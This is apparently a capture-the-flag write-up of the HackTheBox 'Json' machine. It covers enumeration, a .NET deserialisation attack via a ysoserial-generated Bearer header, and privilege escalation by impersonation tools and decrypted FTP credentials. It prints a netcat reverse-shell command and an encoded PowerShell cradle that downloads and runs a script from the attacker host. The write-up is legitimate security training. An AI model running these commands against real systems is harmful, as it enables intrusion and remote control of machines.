# Json

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.191
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 12:18 +08
Nmap scan report for 10.129.227.191
Host is up (0.0072s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```

Lots of ports open. WinRM is open, so if we get creds we can use `evil-winrm`.

### FTP Anonymous Fail

As usual, when I see FTP open I always attempt an anonymous login, which fails for this machine:

```
$ ftp 10.129.227.191
Connected to 10.129.227.191.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.129.227.191:kali): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
```

### Port 80 -> Enumeration

Port 80 just shows us a login for HackTheBox:

<figure><img src="../../../.gitbook/assets/image (2560).png" alt=""><figcaption></figcaption></figure>

When the traffic is viewed in Burpsuite, we can see a lot of different JS files being loaded as well:

<figure><img src="../../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

The POST request to `/api/token` was my first login attempt:

<figure><img src="../../../.gitbook/assets/image (3420).png" alt=""><figcaption></figcaption></figure>

I noticed that in the requests proxied, there wasn't any request to `/`. When I visit it, the dashboard loads for a brief second before redirecting me to the login page. Weird. Anyways we can take a look at some of these JS files since we don't have any credentials yet.&#x20;

One of them was particularly interesting:

<figure><img src="../../../.gitbook/assets/image (3305).png" alt=""><figcaption></figcaption></figure>

The `app.min.js` file was obfuscated JS code. We can deobfuscate it here:

{% embed url="https://deobfuscate.io/" %}

```javascript
angular.module("json", ["ngCookies"]).controller("loginController", ["$http", "$scope", "$cookies", function (izzat, shaunae, mariola) {
  shaunae.credentials = {UserName: "", Password: ""};
  shaunae.error = {message: "", show: false};
  var nicandro = mariola.get("OAuth2");
  if (nicandro) {
    window.location.href = "index.html";
  }
  ;
  shaunae.login = function () {
    izzat.post("/api/token", shaunae.credentials).then(function (hailei) {
      window.location.href = "index.html";
    }, function (eldyn) {
      shaunae.error.message = "Invalid Credentials.";
      shaunae.error.show = true;
      console.log(eldyn);
    });
  };
}]).controller("principalController", ["$http", "$scope", "$cookies", function (zuleyka, janaliz, jeovany) {
  var trung = jeovany.get("OAuth2");
  if (trung) {
    zuleyka.get("/api/Account/", {headers: {Bearer: trung}}).then(function (mickela) {
      janaliz.UserName = mickela.data.Name;
    }, function (alirah) {
      jeovany.remove("OAuth2");
      window.location.href = "login.html";
    });
  } else {
    window.location.href = "login.html";
  }
}]);
```

This bit of code reveals a bit more about how the POST requests to `/api/token` are processed. We can try to send a POST request with `admin:admin` as the fields. This returns a request with the `OAuth2` cookie set to a JWT looking token:

<figure><img src="../../../.gitbook/assets/image (3742).png" alt=""><figcaption></figcaption></figure>

When decoded, we get this:

```
$ echo eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0= | base64 -d | jq
{
  "Id": 1,
  "UserName": "admin",
  "Password": "21232f297a57a5a743894a0e4a801fc3",
  "Name": "User Admin HTB",
  "Rol": "Administrator"
}
```

Interesting. I tried to login via the normal method and it worked! We can see the dashboard:

<figure><img src="../../../.gitbook/assets/image (2353).png" alt=""><figcaption></figcaption></figure>

The dashboard was static, so there wasn't much to do here.

### Deseralisation -> RCE

As per the deobfuscated JS code, there's an `/api/Account` endpoint within the site. When I logged in the normal way above, I saw one request sent to there.&#x20;

<figure><img src="../../../.gitbook/assets/image (3222).png" alt=""><figcaption></figcaption></figure>

The response was the same as the decoded cookie value! This means that either the `OAuth2` cookie or the `Bearer` HTTP header value was being deserialised and decoded via `base64` or something. If we remove a few characters from the `Bearer` header, we get an error:

<figure><img src="../../../.gitbook/assets/image (1328).png" alt=""><figcaption></figcaption></figure>

If we remove more characters, we get this error:

<figure><img src="../../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

There definitely is an insecure deserialisation exploit here, because the values of the `Bearer` header are likely unsanitised since it still attempts to process it. As such, we can use `ysoserial.exe` to generate a payload to give us a reverse shell.&#x20;

{% embed url="https://github.com/pwntester/ysoserial.net" %}

`ysoserial.exe` has a lot of different gadgets, of which we should be using those that have the `Json.Net` formatters since we were being returned JSON in the request. This also matches the website, since it is hosted using ASP.NET. We can try to get a reverse shell using `smbserver.py` to execute `nc64.exe`.&#x20;

I tried using this gadget, but it didn't work:

```
C:\Users\User\htb\Release>.\ysoserial.exe -g WindowsPrincipal -f Json.Net -c "\\\\10.10.14.42\\share\\nc64.exe -e cmd.exe 10.10.14.42 4444" -o base64
ew0KICAgICAgICAgICAgICAgICAgICAnJHR5cGUnOiAnU3lzdGVtLlNlY3VyaXR5LlByaW5jaXB...
```

So I tried different gadgets, and eventually the `ObjectDataProvider` one worked. In my testing, it threw a lot of Powershell errors, so I thought it would be better if we used a Powershell shell instead.

First, let's get the encoded Powershell command:

{% code overflow="wrap" %}
```
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.42/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0; echo

SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
```
{% endcode %}

Afterwards, we can pass this into `ysoserial.exe`.&#x20;

{% code overflow="wrap" %}
```
ysoserial.exe -g ObjectDataProvider -f json.net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
{% endcode %}

Then, we can send the encoded payload as the value of the `Bearer` header.&#x20;

<figure><img src="../../../.gitbook/assets/image (1362).png" alt=""><figcaption></figcaption></figure>

This would still return 500, but we would get a GET request for `shell.ps1` on a HTTP server and a reverse shell on our listener port!

<figure><img src="../../../.gitbook/assets/image (2038).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag.

## Privilege Escalation

### Method 1: Privilege Abuse

We had the `SeImpersonatePrivilege` enabled for this user:

```
PS C:\users\userpool\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We can either abuse `JuicyPotato.exe` or just use `PrintSpoofer.exe`. Both work. Before doing those, make sure to download `nc.exe` to get a `cmd.exe` shell instead of a Powershell one.&#x20;

<figure><img src="../../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>

We can find the `root.txt` flag in the `superadmin` user's desktop.&#x20;

### Method 2: FTP

In the `C:\Program Files` directory, there's a non-default application present as `Sync2Ftp`:

```
C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of C:\Program Files

08/08/2019  07:04 PM    <DIR>          .
08/08/2019  07:04 PM    <DIR>          ..
08/08/2019  07:04 PM    <DIR>          Common Files
11/21/2014  07:24 AM    <DIR>          Embedded Lockdown Manager
08/08/2019  07:04 PM    <DIR>          Internet Explorer
05/22/2019  04:37 PM    <DIR>          MSBuild
05/22/2019  04:37 PM    <DIR>          Reference Assemblies
05/23/2019  03:06 PM    <DIR>          Sync2Ftp
05/22/2019  04:28 PM    <DIR>          VMware
08/08/2019  07:04 PM    <DIR>          Windows Mail
08/08/2019  07:04 PM    <DIR>          Windows Media Player
08/08/2019  07:04 PM    <DIR>          Windows Multimedia Platform
08/08/2019  07:04 PM    <DIR>          Windows NT
08/08/2019  07:04 PM    <DIR>          Windows Photo Viewer
08/08/2019  07:04 PM    <DIR>          Windows Portable Devices
11/21/2014  07:24 AM    <DIR>          WindowsPowerShell

 Directory of C:\Program Files\Sync2Ftp

05/23/2019  03:06 PM    <DIR>          .
05/23/2019  03:06 PM    <DIR>          ..
05/23/2019  02:48 PM             9,728 SyncLocation.exe
05/23/2019  03:08 PM               591 SyncLocation.exe.config
```

The config files contained some encoded stuff:

```markup
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="destinationFolder" value="ftp://localhost/"/>
    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
    <add key="minute" value="30"/>
    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>


</configuration>
```

This uses .NET, so we can download it back to our Windows machine and use `DnSpy.exe` on it. When loaded, the binary contains some interesting functions:

<figure><img src="../../../.gitbook/assets/image (1502).png" alt=""><figcaption></figcaption></figure>

It appears that it can Decrypt the password that we found in the config file. Here's the decrypt function:

```csharp
public static string Decrypt(string cipherString, bool useHashing)
{
	byte[] array = Convert.FromBase64String(cipherString);
	AppSettingsReader appSettingsReader = new AppSettingsReader();
	string s = (string)appSettingsReader.GetValue("SecurityKey", typeof(string));
	byte[] key;
	if (useHashing)
	{
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
		md5CryptoServiceProvider.Clear();
	}
	else
	{
		key = Encoding.UTF8.GetBytes(s);
	}
	TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
	tripleDESCryptoServiceProvider.Key = key;
	tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
	tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
	ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
	byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
	tripleDESCryptoServiceProvider.Clear();
	return Encoding.UTF8.GetString(bytes);
}
```

This uses 3DES to decrypt, and since we have the correct files, we can create a Python script that does the same.

```python
from Crypto.Cipher import DES3
import base64
import hashlib
key = b'_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%'
user = '4as8gqENn26uTs9srvQLyg=='
password = 'oQ5iORgUrswNRsJKH9VaCw=='

def decrypt_3des(key, ciphertext):
	ciphertext = base64.b64decode(ciphertext)
	actual_key = hashlib.md5(key).digest()
	cipher = DES3.new(actual_key, DES3.MODE_ECB)
	plaintext = cipher.decrypt(ciphertext)
	return plaintext.decode('utf-8')

print(decrypt_3des(key,user))
print(decrypt_3des(key,password))

$ python3 decrypt.py
superadmin
funnyhtb
```

With this, we can try to access the FTP server again.&#x20;

```
$ ftp 10.129.159.228
Connected to 10.129.159.228.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.129.159.228:kali): superadmin
331 Password required for superadmin
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57901|)
150 Opening data channel for directory listing of "/"
drwxr-xr-x 1 ftp ftp              0 May 22  2019 AppData
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Application Data
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Contacts
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Cookies
drwxr-xr-x 1 ftp ftp              0 Mar 17  2021 Desktop
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Documents
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Downloads
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Favorites
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Links
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Local Settings
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Music
drwxr-xr-x 1 ftp ftp              0 May 22  2019 My Documents
drwxr-xr-x 1 ftp ftp              0 May 22  2019 NetHood
-r--r--r-- 1 ftp ftp         524288 Jun 30 01:03 NTUSER.DAT
-r--r--r-- 1 ftp ftp           8192 May 22  2019 ntuser.dat.LOG1
-r--r--r-- 1 ftp ftp         122880 May 22  2019 ntuser.dat.LOG2
-r--r--r-- 1 ftp ftp          65536 May 22  2019 NTUSER.DAT{a8bf096c-714a-11e4-80c0-a4badb286356}.TM.blf
-r--r--r-- 1 ftp ftp         524288 May 22  2019 NTUSER.DAT{a8bf096c-714a-11e4-80c0-a4badb286356}.TMContainer00000000000000000001.regtrans-ms
-r--r--r-- 1 ftp ftp         524288 May 22  2019 NTUSER.DAT{a8bf096c-714a-11e4-80c0-a4badb286356}.TMContainer00000000000000000002.regtrans-ms
-r--r--r-- 1 ftp ftp             20 May 22  2019 ntuser.ini
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Pictures
drwxr-xr-x 1 ftp ftp              0 May 22  2019 PrintHood
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Recent
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Saved Games
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Searches
drwxr-xr-x 1 ftp ftp              0 May 22  2019 SendTo
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Start Menu
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Templates
drwxr-xr-x 1 ftp ftp              0 May 22  2019 Videos
226 Successfully transferred "/"

ftp> cd Desktop
250 CWD successful. "/Desktop" is current directory.
ftp> ls
229 Entering Extended Passive Mode (|||50164|)
150 Opening data channel for directory listing of "/Desktop"
-r--r--r-- 1 ftp ftp            282 May 22  2019 desktop.ini
-r--r--r-- 1 ftp ftp             34 Jun 30 01:03 root.txt
```

We now have access to the entire file system via FTP and can download the flag via this method.&#x20;
